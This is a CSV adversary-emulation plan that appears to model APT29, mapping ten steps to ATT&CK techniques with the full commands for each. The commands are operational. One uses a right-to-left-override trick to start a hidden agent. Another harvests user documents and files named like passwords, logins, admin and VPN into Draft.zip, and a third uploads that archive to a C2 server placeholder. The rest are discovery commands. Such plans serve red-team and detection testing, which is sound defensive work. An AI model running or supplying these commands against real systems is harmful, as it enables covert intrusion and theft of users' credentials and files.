source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
apt29,apt29,APT29,1,1,571845f6-b75c-4b9d-a666-a78f7827261f,1.A,execution,T1036.002,Masquerading: Right-to-Left Override,RTLO Start Sandcat,Perform RTLO technique with SANDCAT,"Sleep 3; $bin = Get-ChildItem *cod*scr*; $arguments = '-server ""#{server}"" -group ""rtlo_group""'; start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments; if ($?) { write-host ""Successfully ...","Sleep 3;
$bin = Get-ChildItem *cod*scr*;
$arguments = '-server ""#{server}"" -group ""rtlo_group""';
start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;

if ($?) {
  write-host ""Successfully completed RTLO execution. A new agent should appear"";
  exit 0;

} else {
  write-host ""Failure of RTLO execution."";
  exit 1;
}"
apt29,apt29,APT29,1,2,a5daa530-c640-49bc-aa54-6808789a684a,1.B,execution,T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell,Spawn powershell.exe from cmd.exe,"powershell.exe; if ($?) { write-host ""[*] PowerShell successfully spawned""; exit 0; }","powershell.exe;
if ($?) {
  write-host ""[*] PowerShell successfully spawned"";
  exit 0;
}"
apt29,apt29,APT29,2,3,5692da31-3586-4e4f-8f07-5750070c730b,2.A.1,collection,T1119,Automated Collection,Automated Collection,Execute PowerShell from cmd.exe to collect and compress files of specific extensions.,"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*ad...","$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force"
apt29,apt29,APT29,2,4,ee08a427-1e1d-4d8a-aeb1-978a7fcf9087,2.A.2,discovery,T1016,System Network Configuration Discovery,System Network Configuration Discovery,The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.,ipconfig /all,ipconfig /all
apt29,apt29,APT29,2,5,64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce,2.A.3,discovery,T1016,System Network Configuration Discovery,System Network Configuration Discovery,The arp utility is executed via cmd to enumerate local ARP configuration information.,arp -a,arp -a
apt29,apt29,APT29,2,6,35d95b64-c1f8-4ac7-a2f2-8959218239cd,2.B.1,discovery,T1033,System Owner/User Discovery,System Owner / User Discovery,The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.,echo %USERDOMAIN%\%USERNAME%,echo %USERDOMAIN%\%USERNAME%
apt29,apt29,APT29,2,7,68e209dd-f354-4adc-8bc6-e85a3e55a7f4,2.B.2,exfiltration,T1041,Exfiltration Over Command and Control Channel,Data from staged fileand Exfiltration over C2 Channel,Copy a target file from a remote file share through the existing C2 channel,"Import-Module .\upload.ps1 -Verbose -Force; Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";","Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";"
apt29,apt29,APT29,2,8,5df12481-9d8c-4235-b550-9cefc8ed7361,2.C.1,discovery,T1057,Process Discovery,Process Discovery,API call(s) are executed to enumerate local running processes.,Import-Module .\ps.ps1 -Verbose -Force; ProcessList,"Import-Module .\ps.ps1 -Verbose -Force;
ProcessList"
apt29,apt29,APT29,2,9,41610306-087c-4c34-874b-37b8ed633a36,2.C.2,discovery,T1057,Process Discovery,Process Discovery,The tasklist utility is executed via cmd to enumerate local running processes.,tasklist /v,tasklist /v
apt29,apt29,APT29,2,10,2ff877b4-0c00-401e-9d3f-070c70b610df,2.D.1,discovery,T1007,System Service Discovery,System Service Discovery,The sc utility is executed via cmd to enumerate local active services.,sc query,sc query
